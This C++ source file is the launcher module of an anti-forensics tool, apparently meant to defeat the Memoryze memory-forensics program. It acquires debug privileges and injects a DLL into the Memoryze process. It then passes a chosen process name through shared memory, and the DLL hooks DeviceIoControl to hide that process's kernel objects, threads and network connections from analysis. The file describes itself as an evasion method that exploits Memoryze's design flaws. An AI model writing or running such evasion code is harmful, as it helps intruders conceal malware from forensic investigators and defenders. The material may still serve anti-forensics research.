#include "StdAfx.h"
#include "MemoryzeUM.h"
#include "Logger.h"
#include "Utils.h"
#include "ProcessMonitor.h"
#include "HexWriter.h"
#include "../Common/MemoryzeUMEvents.h"

namespace po = boost::program_options;

MemoryzeUM::MemoryzeUM(int ID) 
{
	// set general information variables for this method
	m_ID = ID;
	m_Name = _T("Memoryze usermode evasion");
	m_shortDesc = _T("Hides kernel level objects - process block, threads and network connections from the usermode");
	m_longDesc = _T("This evasion method uses design flaws in Memoryze forensics tool in order to hide valuable artifacts ") 
				 _T("and evade analysis. The method works by hooking DeviceIoControl() function inside the Memoryze process and ")
				 _T("modify obtained buffers (i.e. conceal presence of arbitrary objects)");
	m_argDesc = _T("\t-i|--info - this information\n\t\t")
				_T("-m|--memoryze-name - name of the Memoryze process (default: Memoryze.exe)\n\t\t")
				_T("-p|--process-name - name of the process whose artifacts (EPROCESS block etc.) should be hidden\n\t\t")
				_T("-r|--rescan - if set to 0, only one injection will be made - if process with the same name is created afterwards, no injection will take place (default: 1)\n\t\t")
				_T("-s|--scan-interval - time interval in seconds that the monitoring thread should sleep before enumerating active processes in search for the target process (default: 3 seconds)");
	m_example = _T("TBD");

	// by default, use Memoryze.exe as a name for Memoryze process that will be injected
	m_memoryzeProcessName = _T("Memoryze.exe");

	// DLL to inject is not specified on the command line - it is "fixed" MemoryzeUM.dll DLL
	m_DLLName = _T("MemoryzeUM.dll");

	// initialize read/write event names used for synchronization, as well as mapping name
	m_sharedMemory.reset();
	m_sharedMemoryTarget.reset();

	// process scan interval defaults to 3 seconds
	m_processScanInterval = 3;

	// scan for target processes by default (processes with the name equal to passed "memoryze-name" will be always injected on creation)
	m_rescan = 1;

	// initialize options_description, for command line arguments parsing
	m_options.add_options()
		("info,i", "detailed method/module description")
		("memoryze-name,m", po::value<std::string>(), "name of the Memoryze process (default: Memoryze.exe)")
		("process-name,p", po::value<std::string>(), "name of the process whose artifacts (EPROCESS block etc.) should be hidden")
		("rescan,r", po::value<int>(), "if set to 0, only one injection will be made - if process with the same name is created afterwards, no injection will take place (default: 1)")
		("scan-interval,s", po::value<int>(), "time interval in seconds that the monitoring thread should sleep before enumerating active processes in search for the target process (default: 3 seconds)")
		;
}

MemoryzeUM::~MemoryzeUM(void)
{
	// intentionally left empty
}

bool MemoryzeUM::Execute(void)
{
	// first make sure that we are admin - memoryze runs as ADMIN ONLY!
	Logger::Instance().Log(_T("Check if running under administrator context..."), INFO);
	if(!Utils::IsAdmin())
	{
		Logger::Instance().Log(_T("Not admin - try to run the program as administrator"), CRITICAL_ERROR);
		return false;
	}
	Logger::Instance().Log(_T("Running as administrator"), SUCCESS);

	// obtain SeDebugPrivileges -- we need this privilege to open handles of some processes
	Logger::Instance().Log(_T("Obtaining SeDebugPrivileges..."), INFO);
	if(!Utils::GetSeDebugPrivilege())
	{
		Logger::Instance().Log(_T("Could not obtain privileges -- problems while opening process handles are likely"), WARNING);
	}
	else
	{
		Logger::Instance().Log(_T("Successfully obtained SeDebugPrivilege"), SUCCESS);
	}

	// create shared memory and synchronization events
	m_sharedMemory.reset(new SharedMemory<SHARED_BLOCK>(MEMORYZEREADEVENTNAME, MEMORYZEWRITEEVENTNAME, MEMORYZESHAREDMEMORYNAME));
	m_sharedMemoryTarget.reset(new SharedMemory<TARGET_PROCESS_BLOCK>(MEMORYZETARGETREADEVENTNAME, MEMORYZETARGETWRITEEVENTNAME, MEMORYZETARGETSHAREDMEMORYNAME));
	
	// process monitor creates a new thread that looks for Memoryze.exe process and injects a new thread in it
	boost::scoped_ptr<ProcessMonitor> monitor(new ProcessMonitor(m_targetProcessName, m_memoryzeProcessName, m_DLLName, m_rescan, m_processScanInterval));

	// first write the target process details to shared memory - DLL will read it and hide its artifacts
	TARGET_PROCESS_BLOCK procBlock;
	memset(&procBlock, 0, sizeof(TARGET_PROCESS_BLOCK));

	// block uses ASCII process name
	std::string procName;
	procName.assign(m_targetProcessName.begin(), m_targetProcessName.end());
	strcpy_s(procBlock.szProcessName, 128, procName.c_str());
	m_sharedMemoryTarget->Write(&procBlock);

	// read and wait data from DLL injected in Memoryze process
	while(true)
	{
		SHARED_BLOCK sharedBlock = m_sharedMemory->Read();
		TCharString message(sharedBlock.szInfoMessage);
		Logger::Instance().Log(message, SUCCESS);
		if(Logger::Instance().IsDebug())
		{
			HexWriter::HexDump(sharedBlock.dwAddress, (LPBYTE) sharedBlock.bCapturedBuffer, 4096, sharedBlock.dwHighlightOffset, sharedBlock.dwHighlightLength);
		}
	}
	return true;
}

bool MemoryzeUM::ParseArguments(std::string args)
{
	try
	{
		// first split the input args by space
		// again - using strings directly, otherwise we would need to use conversions
		// horrible code ahead
		std::vector<std::string> tokens;
		std::istringstream argsStream(args);
		copy(std::istream_iterator<std::string>(argsStream), std::istream_iterator<std::string>(), std::back_inserter<std::vector<std::string>>(tokens));

		// we have to emulate the real argv passed from the console/operating system
		// first entry should resemble program name - it is discarded
		// last entry is NULL
		// that's why we add 2 elems to the size of the argv array
		char **argv = new char*[tokens.size()+2];
		argv[0] = new char[5];
		strncpy_s(argv[0], 5, "NONE", 4);
		for(unsigned int i = 0; i < tokens.size(); i++)
		{
			argv[i+1] = new char[tokens[i].size() + 1];
			strncpy_s(argv[i+1], tokens[i].size() + 1, tokens[i].c_str(), tokens[i].size());
		}
		argv[tokens.size()+1] = NULL;

		po::variables_map vm;
		po::store(po::parse_command_line(tokens.size()+1, argv, m_options), vm);
		po::notify(vm);

		// deallocate memory
		for(unsigned int i = 0; i < tokens.size(); i++)
		{
			delete[] argv[i];
		}
		delete[] argv;

		if(vm.count("info") || !vm.count("process-name")) {
			TCharString moduleInfo = _T("\nModule: ") + m_Name + _T("\n\nArguments: ") + m_argDesc + _T("\n\nDescription: ") + m_longDesc + _T("\n\nExample: ") + m_example;
			Logger::Instance().Log(moduleInfo, INFO);
			return false;
		}

		if(vm.count("scan-interval"))
		{
			m_processScanInterval = vm["scan-interval"].as<int>();
		}

		if(vm.count("rescan"))
		{
			m_rescan = vm["rescan"].as<int>();
		}

		std::string memoryzeProcessName;

		if(vm.count("memoryze-name"))
		{
			memoryzeProcessName = vm["memoryze-name"].as<std::string>();
		}

		std::string procName = vm["process-name"].as<std::string>();
#ifdef _UNICODE
		m_targetProcessName.assign(procName.begin(), procName.end());
		if(!memoryzeProcessName.empty())
		{
			m_memoryzeProcessName.assign(memoryzeProcessName.begin(), memoryzeProcessName.end());
		}
#else
		m_targetProcessName = procName;
		if(!memoryzeProcessName.empty())
		{
			m_memoryzeProcessName = memoryzeProcessName;
		}
#endif // _UNICODE	
		return true;
	}
	catch(std::exception& e) 
	{
		std::string msg(e.what());
		msg = "\nException occurred while parsing method arguments: " + msg;

		// ugly hacks
#ifdef _UNICODE
		std::wstring ws;
		ws.assign(msg.begin(), msg.end());
		Logger::Instance().Log(ws, CRITICAL_ERROR); 
#else
		Logger::Instance().Log(msg, CRITICAL_ERROR); 
#endif // _UNICODE
		return false;
	}
}